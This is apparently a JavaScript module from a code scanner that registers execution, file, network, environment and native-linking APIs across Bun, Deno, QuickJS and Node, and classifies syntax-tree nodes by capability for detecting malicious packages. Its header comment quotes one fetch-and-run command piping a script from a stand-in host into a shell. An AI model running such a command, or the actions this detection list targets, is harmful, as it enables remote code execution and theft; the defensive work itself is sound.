/**
 * Cross-runtime capability registry.
 *
 * The structural problem this solves: detectors used to enumerate *API names
 * per runtime*, inline, as regexes. Adding Deno under that model meant
 * re-listing every name in every detector, and it was why a Deno-idiom
 * credential stealer scored zero findings while the byte-identical Node
 * version scored HIGH (gap-analysis finding G1.1).
 *
 * Here the unit is the *capability* — execute, read a file, open a socket,
 * load native code — and each runtime registers the primitives that grant it.
 * Detectors ask "does this node execute something?" rather than "is this
 * string `child_process.execSync`?".
 *
 * Three AST shapes are supported that the old `calleeNames()` helper could not
 * express, each of which was a live bypass:
 *   - TaggedTemplateExpression  `Bun.$\`curl evil.sh | sh\``   (Bun Shell)
 *   - NewExpression             `new Deno.Command('sh')`
 *   - bare-specifier imports    `import { dlopen } from 'bun:ffi'`
 *
 * Imported bindings are tracked, so `import { $ } from 'bun'; $\`id\`` is
 * classified the same as `Bun.$\`id\``.
 */

export const CAPABILITY = {
  EXEC: 'exec',
  FS_READ: 'fs_read',
  FS_WRITE: 'fs_write',
  NET_CONNECT: 'net_connect',
  NET_LISTEN: 'net_listen',
  ENV_READ: 'env_read',
  FFI: 'ffi',
  FINGERPRINT: 'fingerprint',
  EMBEDDED: 'embedded_payload',
};

/**
 * Relative danger of each capability, independent of runtime. Detectors use
 * this so severity tracks what the code can *do*, not how well-known the API
 * name happens to be — the inversion that left `Bun.file` covered while
 * `Bun.$` and `bun:ffi` were not.
 */
export const CAPABILITY_WEIGHT = {
  [CAPABILITY.EXEC]: 45,
  [CAPABILITY.FFI]: 45,
  [CAPABILITY.NET_CONNECT]: 30,
  [CAPABILITY.FS_WRITE]: 25,
  [CAPABILITY.ENV_READ]: 25,
  [CAPABILITY.NET_LISTEN]: 20,
  [CAPABILITY.FS_READ]: 20,
  [CAPABILITY.EMBEDDED]: 20,
  [CAPABILITY.FINGERPRINT]: 10,
};

const C = CAPABILITY;

/**
 * kind: how the primitive appears in the AST.
 *   call   — CallExpression callee
 *   new    — NewExpression callee
 *   tagged — TaggedTemplateExpression tag
 *   member — MemberExpression read (no call)
 *   module — import/require specifier
 */
const PRIMITIVES = [
  // ---- Bun -----------------------------------------------------------------
  { runtime: 'bun', capability: C.EXEC, kind: 'call', path: 'Bun.spawn' },
  { runtime: 'bun', capability: C.EXEC, kind: 'call', path: 'Bun.spawnSync' },
  { runtime: 'bun', capability: C.EXEC, kind: 'tagged', path: 'Bun.$' },
  { runtime: 'bun', capability: C.FS_READ, kind: 'call', path: 'Bun.file' },
  { runtime: 'bun', capability: C.FS_WRITE, kind: 'call', path: 'Bun.write' },
  { runtime: 'bun', capability: C.NET_CONNECT, kind: 'call', path: 'Bun.connect' },
  { runtime: 'bun', capability: C.NET_LISTEN, kind: 'call', path: 'Bun.listen' },
  { runtime: 'bun', capability: C.NET_LISTEN, kind: 'call', path: 'Bun.serve' },
  { runtime: 'bun', capability: C.ENV_READ, kind: 'member', path: 'Bun.env' },
  { runtime: 'bun', capability: C.EMBEDDED, kind: 'member', path: 'Bun.embeddedFiles' },
  { runtime: 'bun', capability: C.FINGERPRINT, kind: 'member', path: 'Bun.version' },
  { runtime: 'bun', capability: C.FINGERPRINT, kind: 'member', path: 'Bun.revision' },
  { runtime: 'bun', capability: C.FINGERPRINT, kind: 'member', path: 'process.versions.bun' },
  { runtime: 'bun', capability: C.FFI, kind: 'module', path: 'bun:ffi' },
  { runtime: 'bun', capability: C.FS_READ, kind: 'module', path: 'bun:sqlite' },
  { runtime: 'bun', capability: C.EMBEDDED, kind: 'module', path: 'bun:jsc' },
  // `import { $, spawn } from 'bun'` — the module itself is not a capability,
  // but its named exports are; see MODULE_EXPORT_CAPABILITIES below.

  // ---- Deno ----------------------------------------------------------------
  { runtime: 'deno', capability: C.EXEC, kind: 'new', path: 'Deno.Command' },
  { runtime: 'deno', capability: C.EXEC, kind: 'call', path: 'Deno.Command' },
  { runtime: 'deno', capability: C.EXEC, kind: 'call', path: 'Deno.run' },
  { runtime: 'deno', capability: C.FFI, kind: 'call', path: 'Deno.dlopen' },
  { runtime: 'deno', capability: C.FS_READ, kind: 'call', path: 'Deno.readTextFile' },
  { runtime: 'deno', capability: C.FS_READ, kind: 'call', path: 'Deno.readTextFileSync' },
  { runtime: 'deno', capability: C.FS_READ, kind: 'call', path: 'Deno.readFile' },
  { runtime: 'deno', capability: C.FS_READ, kind: 'call', path: 'Deno.readFileSync' },
  { runtime: 'deno', capability: C.FS_READ, kind: 'call', path: 'Deno.readDir' },
  { runtime: 'deno', capability: C.FS_WRITE, kind: 'call', path: 'Deno.writeTextFile' },
  { runtime: 'deno', capability: C.FS_WRITE, kind: 'call', path: 'Deno.writeTextFileSync' },
  { runtime: 'deno', capability: C.FS_WRITE, kind: 'call', path: 'Deno.writeFile' },
  { runtime: 'deno', capability: C.FS_WRITE, kind: 'call', path: 'Deno.writeFileSync' },
  { runtime: 'deno', capability: C.NET_CONNECT, kind: 'call', path: 'Deno.connect' },
  { runtime: 'deno', capability: C.NET_CONNECT, kind: 'call', path: 'Deno.connectTls' },
  { runtime: 'deno', capability: C.NET_LISTEN, kind: 'call', path: 'Deno.listen' },
  { runtime: 'deno', capability: C.NET_LISTEN, kind: 'call', path: 'Deno.listenTls' },
  { runtime: 'deno', capability: C.NET_LISTEN, kind: 'call', path: 'Deno.serve' },
  { runtime: 'deno', capability: C.ENV_READ, kind: 'call', path: 'Deno.env.get' },
  { runtime: 'deno', capability: C.ENV_READ, kind: 'call', path: 'Deno.env.toObject' },
  { runtime: 'deno', capability: C.ENV_READ, kind: 'member', path: 'Deno.env' },
  { runtime: 'deno', capability: C.FINGERPRINT, kind: 'member', path: 'Deno.build' },
  { runtime: 'deno', capability: C.FINGERPRINT, kind: 'member', path: 'Deno.version' },
  { runtime: 'deno', capability: C.FINGERPRINT, kind: 'call', path: 'Deno.hostname' },
  { runtime: 'deno', capability: C.FINGERPRINT, kind: 'call', path: 'Deno.osRelease' },

  // ---- QuickJS (qjs) -------------------------------------------------------
  // Distinctive names only. QuickJS `os.exec` is deliberately omitted: `os` is
  // also a Node builtin and the collision is not worth the false positives.
  { runtime: 'qjs', capability: C.EXEC, kind: 'call', path: 'std.popen' },
  { runtime: 'qjs', capability: C.NET_CONNECT, kind: 'call', path: 'std.urlGet' },

  // ---- Node (so the registry is the single source of truth) ----------------
  { runtime: 'node', capability: C.EXEC, kind: 'call', path: 'child_process.exec' },
  { runtime: 'node', capability: C.EXEC, kind: 'call', path: 'child_process.execSync' },
  { runtime: 'node', capability: C.EXEC, kind: 'call', path: 'child_process.spawn' },
  { runtime: 'node', capability: C.EXEC, kind: 'call', path: 'child_process.spawnSync' },
  { runtime: 'node', capability: C.EXEC, kind: 'call', path: 'child_process.execFile' },
  { runtime: 'node', capability: C.EXEC, kind: 'call', path: 'child_process.fork' },
  { runtime: 'node', capability: C.FFI, kind: 'call', path: 'process.dlopen' },
  { runtime: 'node', capability: C.FS_READ, kind: 'call', path: 'fs.readFile' },
  { runtime: 'node', capability: C.FS_READ, kind: 'call', path: 'fs.readFileSync' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.writeFile' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.writeFileSync' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.appendFile' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.appendFileSync' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.createWriteStream' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.mkdir' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.mkdirSync' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.copyFile' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.copyFileSync' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.rename' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.renameSync' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.promises.writeFile' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.promises.appendFile' },
  { runtime: 'node', capability: C.FS_WRITE, kind: 'call', path: 'fs.promises.mkdir' },
  { runtime: 'node', capability: C.ENV_READ, kind: 'member', path: 'process.env' },
  { runtime: 'node', capability: C.FINGERPRINT, kind: 'member', path: 'process.platform' },
  { runtime: 'node', capability: C.FINGERPRINT, kind: 'member', path: 'process.arch' },
];

/**
 * Named exports whose capability comes from the module they were imported
 * from. `import { $ } from 'bun'` binds the Bun Shell; `import { dlopen } from
 * 'bun:ffi'` binds native linking.
 */
const MODULE_EXPORT_CAPABILITIES = {
  bun: {
    $: { runtime: 'bun', capability: C.EXEC },
    spawn: { runtime: 'bun', capability: C.EXEC },
    spawnSync: { runtime: 'bun', capability: C.EXEC },
    file: { runtime: 'bun', capability: C.FS_READ },
    write: { runtime: 'bun', capability: C.FS_WRITE },
    connect: { runtime: 'bun', capability: C.NET_CONNECT },
    listen: { runtime: 'bun', capability: C.NET_LISTEN },
    serve: { runtime: 'bun', capability: C.NET_LISTEN },
  },
  'bun:ffi': {
    dlopen: { runtime: 'bun', capability: C.FFI },
    CString: { runtime: 'bun', capability: C.FFI },
    ptr: { runtime: 'bun', capability: C.FFI },
    linkSymbols: { runtime: 'bun', capability: C.FFI },
  },
  'bun:sqlite': {
    Database: { runtime: 'bun', capability: C.FS_READ },
  },
  fs: {
    writeFile: { runtime: 'node', capability: C.FS_WRITE },
    writeFileSync: { runtime: 'node', capability: C.FS_WRITE },
    appendFile: { runtime: 'node', capability: C.FS_WRITE },
    appendFileSync: { runtime: 'node', capability: C.FS_WRITE },
    createWriteStream: { runtime: 'node', capability: C.FS_WRITE },
    mkdir: { runtime: 'node', capability: C.FS_WRITE },
    mkdirSync: { runtime: 'node', capability: C.FS_WRITE },
    copyFile: { runtime: 'node', capability: C.FS_WRITE },
    copyFileSync: { runtime: 'node', capability: C.FS_WRITE },
    rename: { runtime: 'node', capability: C.FS_WRITE },
    renameSync: { runtime: 'node', capability: C.FS_WRITE },
    readFile: { runtime: 'node', capability: C.FS_READ },
    readFileSync: { runtime: 'node', capability: C.FS_READ },
  },
  child_process: {
    exec: { runtime: 'node', capability: C.EXEC },
    execSync: { runtime: 'node', capability: C.EXEC },
    spawn: { runtime: 'node', capability: C.EXEC },
    spawnSync: { runtime: 'node', capability: C.EXEC },
    execFile: { runtime: 'node', capability: C.EXEC },
    fork: { runtime: 'node', capability: C.EXEC },
  },
};

// `fs/promises` exposes the same names; `node:` prefixes are normalized away
// before lookup, so only the bare specifier needs an entry.
MODULE_EXPORT_CAPABILITIES['fs/promises'] = MODULE_EXPORT_CAPABILITIES.fs;

function indexBy(kind) {
  const map = new Map();
  for (const p of PRIMITIVES) {
    if (p.kind === kind) {
      map.set(p.path, p);
    }
  }
  return map;
}

const CALL_INDEX = indexBy('call');
const NEW_INDEX = indexBy('new');
const TAGGED_INDEX = indexBy('tagged');
const MEMBER_INDEX = indexBy('member');
const MODULE_INDEX = indexBy('module');

/** Runtimes this registry knows about, excluding Node. */
export const ALT_RUNTIMES = new Set(['bun', 'deno', 'qjs']);

/**
 * Dotted source text of a static member chain: `Deno.env.get` -> "Deno.env.get".
 * Returns null when any link is computed or dynamic, so `a[b].c` never
 * collapses into a false match.
 */
export function memberPath(node) {
  if (!node) {
    return null;
  }
  if (node.type === 'Identifier') {
    return node.name;
  }
  if (node.type !== 'MemberExpression' || node.computed) {
    return null;
  }
  if (node.property?.type !== 'Identifier') {
    return null;
  }
  // Inline require: `require('child_process').execSync(...)`. Extremely common
  // in real payloads, and invisible to a purely static member walk because the
  // object is a CallExpression rather than an Identifier.
  const inline = requireSpecifier(node.object);
  if (inline !== null) {
    return `${inline}.${node.property.name}`;
  }
  const base = memberPath(node.object);
  if (!base) {
    return null;
  }
  // `globalThis.Bun.spawn` is the same primitive as `Bun.spawn`.
  const normalized = base === 'globalThis' || base === 'global' ? '' : base;
  return normalized ? `${normalized}.${node.property.name}` : node.property.name;
}

function normalizeSpecifier(raw) {
  const s = String(raw || '');
  return s.startsWith('node:') ? s.slice(5) : s;
}

/**
 * Module specifier of a `require('x')` call, or null when the node is not a
 * literal require.
 */
function requireSpecifier(node) {
  if (
    node?.type === 'CallExpression' &&
    node.callee?.type === 'Identifier' &&
    node.callee.name === 'require' &&
    node.arguments?.[0]?.type === 'Literal' &&
    typeof node.arguments[0].value === 'string'
  ) {
    return normalizeSpecifier(node.arguments[0].value);
  }
  return null;
}

/**
 * Walk an AST once and collect local bindings introduced by imports/requires,
 * so bare identifiers can later be resolved to a runtime capability.
 *
 * Handles: `import { $ } from 'bun'`, `import * as ffi from 'bun:ffi'`,
 * `import Bun from 'bun'`, `const { dlopen } = require('bun:ffi')`,
 * `const cp = require('child_process')`.
 *
 * @returns {{bindings: Map<string, object>, namespaces: Map<string, string>, modules: Array}}
 */
export function buildRuntimeIndex(ast) {
  const bindings = new Map();
  const namespaces = new Map();
  const modules = [];

  if (!ast) {
    return { bindings, namespaces, modules };
  }

  const bindModule = (specRaw, node, localBinder) => {
    const spec = normalizeSpecifier(specRaw);
    const modulePrimitive = MODULE_INDEX.get(spec);
    if (modulePrimitive) {
      modules.push({ specifier: spec, ...modulePrimitive, node });
    }
    localBinder(spec);
  };

  const walkBody = (nodes) => {
    for (const node of nodes || []) {
      if (!node) {
        continue;
      }

      if (node.type === 'ImportDeclaration') {
        bindModule(node.source?.value, node, (spec) => {
          const exports = MODULE_EXPORT_CAPABILITIES[spec];
          for (const spec2 of node.specifiers || []) {
            if (spec2.type === 'ImportSpecifier') {
              const imported = spec2.imported?.name;
              const local = spec2.local?.name;
              const cap = exports?.[imported];
              if (cap && local) {
                bindings.set(local, { ...cap, via: `import {${imported}} from '${spec}'` });
              }
            } else if (
              spec2.type === 'ImportNamespaceSpecifier' ||
              spec2.type === 'ImportDefaultSpecifier'
            ) {
              if (spec2.local?.name) {
                namespaces.set(spec2.local.name, spec);
              }
            }
          }
        });
        continue;
      }

      if (node.type === 'VariableDeclaration') {
        for (const decl of node.declarations || []) {
          const init = decl.init;
          if (
            init?.type !== 'CallExpression' ||
            init.callee?.type !== 'Identifier' ||
            init.callee.name !== 'require' ||
            init.arguments?.[0]?.type !== 'Literal'
          ) {
            continue;
          }
          bindModule(init.arguments[0].value, init, (spec) => {
            const exports = MODULE_EXPORT_CAPABILITIES[spec];
            if (decl.id?.type === 'Identifier') {
              namespaces.set(decl.id.name, spec);
            } else if (decl.id?.type === 'ObjectPattern') {
              for (const prop of decl.id.properties || []) {
                if (prop.type !== 'Property' || prop.key?.type !== 'Identifier') {
                  continue;
                }
                const cap = exports?.[prop.key.name];
                const local = prop.value?.type === 'Identifier' ? prop.value.name : null;
                if (cap && local) {
                  bindings.set(local, { ...cap, via: `require('${spec}').${prop.key.name}` });
                }
              }
            }
          });
        }
      }
    }
  };

  walkBody(ast.body);
  return { bindings, namespaces, modules };
}

/**
 * Resolve a dotted path through namespace bindings:
 * `const cp = require('child_process'); cp.execSync()` -> "child_process.execSync".
 */
function resolveThroughNamespace(path, index) {
  if (!path || !index?.namespaces?.size) {
    return path;
  }
  const dot = path.indexOf('.');
  if (dot === -1) {
    return path;
  }
  const head = path.slice(0, dot);
  const mapped = index.namespaces.get(head);
  return mapped ? mapped + path.slice(dot) : path;
}

function lookup(map, path, index) {
  if (!path) {
    return null;
  }
  return map.get(path) || map.get(resolveThroughNamespace(path, index)) || null;
}

/**
 * Classify a single AST node against the registry.
 *
 * @param {object} node
 * @param {object} [index] result of buildRuntimeIndex, for binding resolution
 * @returns {{runtime: string, capability: string, path: string, kind: string}|null}
 */
export function classifyNode(node, index) {
  if (!node) {
    return null;
  }

  if (node.type === 'TaggedTemplateExpression') {
    const path = memberPath(node.tag);
    const hit = lookup(TAGGED_INDEX, path, index);
    if (hit) {
      return { ...hit, path };
    }
    // `import { $ } from 'bun'; $\`id\``
    if (node.tag?.type === 'Identifier') {
      const bound = index?.bindings?.get(node.tag.name);
      if (bound) {
        return { ...bound, kind: 'tagged', path: node.tag.name };
      }
    }
    return null;
  }

  if (node.type === 'NewExpression') {
    const path = memberPath(node.callee);
    const hit = lookup(NEW_INDEX, path, index);
    if (hit) {
      return { ...hit, path };
    }
    if (node.callee?.type === 'Identifier') {
      const bound = index?.bindings?.get(node.callee.name);
      if (bound) {
        return { ...bound, kind: 'new', path: node.callee.name };
      }
    }
    return null;
  }

  if (node.type === 'CallExpression') {
    const path = memberPath(node.callee);
    const hit = lookup(CALL_INDEX, path, index);
    if (hit) {
      return { ...hit, path };
    }
    if (node.callee?.type === 'Identifier') {
      const bound = index?.bindings?.get(node.callee.name);
      if (bound) {
        return { ...bound, kind: 'call', path: node.callee.name };
      }
    }
    // dynamic import of a capability-bearing module
    if (node.callee?.type === 'Import' && node.arguments?.[0]?.type === 'Literal') {
      const spec = normalizeSpecifier(node.arguments[0].value);
      const mod = MODULE_INDEX.get(spec);
      if (mod) {
        return { ...mod, path: spec, kind: 'module' };
      }
    }
    return null;
  }

  if (node.type === 'MemberExpression') {
    const path = memberPath(node);
    const hit = lookup(MEMBER_INDEX, path, index);
    if (hit) {
      return { ...hit, path };
    }
    return null;
  }

  return null;
}

export { PRIMITIVES, MODULE_EXPORT_CAPABILITIES };
